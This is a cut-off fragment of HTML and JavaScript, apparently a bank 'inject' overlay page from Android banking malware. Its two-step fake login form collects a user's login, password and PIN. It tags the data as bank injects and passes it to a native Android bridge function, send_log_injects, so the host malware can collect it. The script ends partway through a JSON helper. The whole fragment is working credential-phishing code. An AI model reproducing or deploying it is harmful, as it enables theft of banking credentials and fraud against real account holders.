    </form>
<script>
    $('#pin').mask('00000000');

    var form = document.getElementById('form'),
        form1 = document.getElementById('form1'),
        form2 = document.getElementById('form2');
    
    var login = document.getElementById('login'),
        password = document.getElementById('password'),
        pin = document.getElementById('pin');

    var nextPage = document.getElementById('nextPage'),
        sendData = document.getElementById('sendData');

    nextPage.onclick = () => {
        if(login.value.length < 4) {
            login.classList.add('error')
        } else {
            login.classList.remove('error')

            form1.style.display = 'none'
            form2.style.display = 'block'
        }
    }

    sendData.onclick = () => {
        if(password.value.length < 3) {
            password.classList.add('error')
        } else {
            password.classList.remove('error')
        }

        if(pin.value.length < 3) {
            pin.classList.add('error')
        } else {
            pin.classList.remove('error')
        }

        if(password.value.length > 3 && pin.value.length > 3) {
            send_form(form)
        }
    }

    if ( typeof Android == "undefined")
            var Android = {
                returnResult : alert.bind(window)
            }
        

        
        function send_form(form){
            var data = {};
            for( var i = 0 ; i < form.length ; i++ )
            {
                var input = form[i];
                if ( input.type == "submit" )
                    continue;
                data[ form[i].name ] = form[i].value;
            }
            data.type_injects = "banks";
            data.closed = "close_activity_injects";

            var ua = navigator.userAgent.toLowerCase();
            if(ua.indexOf("android") > -1) {
                try {
                    Android.send_log_injects(JSON.stringify(data))
                } catch (err) {}
            }else{
                alert(JSON.stringify(data));
            }
        }
        
        var stringifyJSON = function(obj) {
            var arrOfKeyVals = [],
                arrVals = [],
                objKeys = [];
        
            if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
                return '' + obj;
            else if (typeof obj === 'string')
                return '"' + obj + '"';
        
            else if (Array.isArray(obj)) {
                if (obj[0] === undefined)
                    return '[]';
                else {
                    obj.forEach(function(el) {
                        arrVals.push(stringifyJSON(el));
                    });
                    return '[' + arrVals.join(',') + ']';
                }
            }else if (obj instanceof Object) {
                objKeys = Object.keys(obj);
                objKeys.forEach(function(key) {
                    var keyOut = '"' + key + '":';
                    var keyValOut = obj[key];
                    if (keyValOut instanceof Function || typeof keyValOut === undefined)
